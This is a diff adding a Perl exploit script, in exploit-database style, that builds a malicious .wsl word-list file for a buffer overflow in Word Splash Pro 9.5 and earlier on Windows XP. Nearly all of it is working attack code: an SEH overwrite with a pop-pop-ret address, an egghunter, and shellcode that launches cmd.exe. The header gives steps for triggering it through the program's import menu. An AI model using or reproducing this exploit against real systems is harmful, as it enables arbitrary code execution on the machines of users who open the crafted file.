@@ -1,0 +1,42 @@
+# Exploit Title: Word Splash Pro  <= 9.5 Buffer Overflow -EggHunter-
+# Software Link: http://www.chronasoft.com/software/wordsplashpro
+# Version: <= 9.5
+# Tested on: Win XP SP3 French
+# Date: 20/12/2010
+# Author: h1ch4m
+#Email: h1ch4m@live.fr
+#Home: Net-Effects.blogspot.com
+#Greetz : Peter Van Eeckhoutte, Exploit-Database Team,  Zhir0
+#Note: tested on version 9.5 & 8.3,  you may have to change the address of pop pop ret according to your sp & the program version
+# triggering details:  file->Word list->Import then click on Word List Builder button 
+
+my $file = "1.wsl";
+
+my $size = 4112;
+
+my $nseh = "\xeb\x06\x90\x90"; # jump 6 bytes
+
+my $seh = pack('V', 0x01de44dc); # pop pop ret  from CRDE2000.DLL
+
+my $egg = "w00tw00t";
+
+my $egghunter = "\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8".
+"\x77\x30\x30\x74". 
+"\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7";
+
+# Shellcode :  windows/XP sp2 (FR) Sellcode cmd.exe 32 bytes - Mountassif Moad aka Stack
+#                      http://www.exploit-db.com/exploits/13510/
+my $shellcode = "\x8B\xEC\x33\xFF\x57".
+"\xC6\x45\xFC\x63\xC6\x45".
+"\xFD\x6D\xC6\x45\xFE\x64".
+"\xC6\x45\xF8\x01\x8D".
+"\x45\xFC\x50\xB8\xC7\x93".
+"\xBF\x77\xFF\xD0";
+
+my $junk = "\x90" x ($size-length($egg.$shellcode));
+
+open($FILE,">$file");
+print $FILE $egg.$shellcode.$junk.$nseh.$seh.$egghunter;
+close($FILE);
+print "File Created successfully\n";
+sleep(1);
